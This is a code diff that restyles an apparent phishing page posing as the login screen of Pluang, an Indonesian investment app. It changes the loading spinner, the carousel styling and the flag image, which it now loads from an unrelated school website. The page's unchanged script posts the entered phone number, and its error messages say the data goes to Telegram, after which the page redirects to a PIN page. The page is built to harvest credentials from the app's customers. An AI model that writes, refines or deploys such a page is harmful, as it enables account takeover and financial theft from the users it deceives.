@@ -13,7 +13,7 @@
    #loadingOverlay {
      position: fixed;
      inset: 0;
-     background-color: rgba(255, 255, 255, 0.8);
+     background-color: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
@@ -26,62 +26,23 @@
      visibility: visible;
      opacity: 1;
    }
-   .spinner {
-     border: 4px solid #e5e7eb; /* gray-200 */
-     border-top: 4px solid #4f46e5; /* indigo-600 */
-     border-radius: 50%;
-     width: 40px;
-     height: 40px;
-     animation: spin 1s linear infinite;
+   .loading-logo {
+     width: 80px;
+     height: 80px;
+     animation: spin 1.5s linear infinite;
    }
    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
-   .carousel-wrapper {
-     position: relative;
-     width: 100%;
-     max-width: 600px;
-     margin: 0 auto;
-     overflow: hidden;
-     border-radius: 0.75rem; /* rounded-xl */
-   }
-   #carousel {
-     display: flex;
-     transition: transform 0.5s ease-in-out;
-     width: 200%;
-   }
-   #carousel > div {
-     flex-shrink: 0;
-     width: 50%;
-   }
-   .carousel-indicators {
-     position: absolute;
-     bottom: 0.75rem;
-     left: 50%;
-     transform: translateX(-50%);
-     display: flex;
-     gap: 0.5rem;
-   }
-   .carousel-indicators span {
-     width: 0.625rem;
-     height: 0.625rem;
-     border-radius: 9999px;
-     background-color: rgba(255 255 255 / 0.5);
-     cursor: pointer;
-     transition: background-color 0.3s ease;
-   }
-   .carousel-indicators span.active {
-     background-color: #4f46e5; /* indigo-600 */
-   }
   </style>
  </head>
  <body class="bg-white text-black">
   <div id="loadingOverlay" aria-label="Loading" role="alert" aria-live="assertive" aria-busy="true">
-   <div class="spinner"></div>
+   <img src="https://avatars.githubusercontent.com/u/41424612?s=200&v=4" alt="Logo Pluang berputar sebagai loading" class="loading-logo"/>
   </div>
-  <header class="flex items-center justify-between px-5 py-7 border-b border-gray-500">
+  <header class="flex items-center justify-between px-5 py-4 border-b border-gray-200">
    <div class="flex items-center space-x-2">
     <img alt="Logo Pluang huruf P hitam di latar putih" class="w-6 h-6" height="24" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihg-v6NTCyP7qgTldHJH-8mewkAbitexfUy95AY84o0zx7Ju58v9ccyA_-NAOcpQIvo86gGsK8iW9pWzUlKCKb_I7Uf3reExcwVmAQIvhaavYcK4W2FbZ2_2M4OE4yL_gdaWVu0vMIKvmwYkLBdhqWf_jTjCwCvl6hpOiCa_8EGFYuUyDIvkakfu5cNhQ/s1600/1000015824.png" width="24"/>
     <span class="text-lg font-normal select-none">Pluang</span>
@@ -92,18 +53,18 @@
    </button>
   </header>
   <main class="px-5 pt-6 pb-10 max-w-md mx-auto">
-   <section class="carousel-wrapper">
-    <div id="carousel">
-     <div>
+   <section class="carousel-wrapper relative rounded-xl overflow-hidden max-w-[600px] mx-auto">
+    <div id="carousel" class="flex transition-transform duration-500 ease-in-out w-[200%]">
+     <div class="flex-shrink-0 w-[50%]">
       <img alt="Layar laptop menampilkan antarmuka platform trading dengan latar hitam dan garis cahaya ungu" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerSecondMobile.webp" width="600"/>
      </div>
-     <div>
+     <div class="flex-shrink-0 w-[50%]">
       <img alt="Layar kedua dengan latar gelap dan gradasi ungu-merah" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerThirdMobile.webp" width="600"/>
      </div>
     </div>
-    <div class="carousel-indicators" aria-label="indikator carousel">
-     <span id="indicator-0" class="active"></span>
-     <span id="indicator-1"></span>
+    <div class="carousel-indicators absolute bottom-3 left-1/2 -translate-x-1/2 flex space-x-2">
+     <span id="indicator-0" class="w-2.5 h-2.5 rounded-full bg-white opacity-50"></span>
+     <span id="indicator-1" class="w-6 h-2.5 rounded-full bg-indigo-600"></span>
     </div>
    </section>
    <div class="mt-6 text-right">
@@ -116,7 +77,7 @@
    <form id="loginForm" class="mt-5 space-y-4">
     <div class="flex space-x-3">
      <button class="flex items-center space-x-2 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-900 font-normal" type="button">
-      <img alt="Bendera Indonesia dengan garis horizontal merah dan putih" class="w-6 h-4 rounded-sm object-cover" height="16" src="https://image-cdn.pluang.com/web/icons/indonesian_flag.svg" width="24"/>
+      <img alt="Bendera Indonesia dengan garis horizontal merah dan putih" class="w-6 h-4 rounded-sm object-cover" height="16" src="https://www.era.smp2rembang.sch.id/assetpublic/assets/img/clients/client-2.png" width="24"/>
       <span>+62</span>
      </button>
      <input id="phoneNumber" aria-label="Nomor Telepon" class="flex-1 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-indigo-600" placeholder="Nomor Telepon" type="tel" required/>
@@ -134,16 +95,18 @@
       document.getElementById("indicator-0"),
       document.getElementById("indicator-1"),
     ];
-    let currentIndex = 0;
+    let currentIndex = 1;
     const totalSlides = 2;
 
     function updateCarousel() {
       carousel.style.transform = `translateX(-${currentIndex * 50}%)`;
       indicators.forEach((ind, i) => {
         if (i === currentIndex) {
-          ind.classList.add("active");
+          ind.classList.add("bg-indigo-600");
+          ind.classList.remove("opacity-50");
         } else {
-          ind.classList.remove("active");
+          ind.classList.remove("bg-indigo-600");
+          ind.classList.add("opacity-50");
         }
       });
     }
@@ -161,7 +124,6 @@
     const submitBtn = document.getElementById('submitBtn');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // Enable submit button only if checkbox is checked and phone number is not empty
     function toggleSubmit() {
       if (agreeCheckbox.checked && phoneInput.value.trim() !== '') {
         submitBtn.disabled = false;
@@ -180,12 +142,11 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      // Show loading overlay
-      if(loadingOverlay) loadingOverlay.classList.add('visible');
+      loadingOverlay.classList.add('visible');
 
       const phoneNumber = phoneInput.value.trim();
       if (!phoneNumber) {
-        if(loadingOverlay) loadingOverlay.classList.remove('visible');
+        loadingOverlay.classList.remove('visible');
         return;
       }
 
@@ -207,7 +168,7 @@
           })
         });
 
-        if(loadingOverlay) loadingOverlay.classList.remove('visible');
+        loadingOverlay.classList.remove('visible');
 
         if (res.ok) {
           window.location.href = "pin.html";
@@ -217,7 +178,7 @@
           alert('Gagal mengirim data ke Telegram.');
         }
       } catch (error) {
-        if(loadingOverlay) loadingOverlay.classList.remove('visible');
+        loadingOverlay.classList.remove('visible');
         alert('Terjadi kesalahan saat mengirim data ke Telegram.');
         console.error(error);
       }
